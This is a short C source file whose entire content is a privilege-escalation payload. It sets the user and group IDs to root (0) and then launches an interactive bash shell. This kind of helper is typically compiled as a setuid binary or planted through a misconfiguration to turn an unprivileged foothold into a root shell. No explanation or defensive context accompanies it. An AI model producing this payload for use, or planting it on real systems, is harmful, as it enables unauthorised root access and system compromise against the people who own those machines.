#include <unistd.h>
#include <stdlib.h>

void main() {
    setuid(0);
    setgid(0);
    system("bash -i");
}
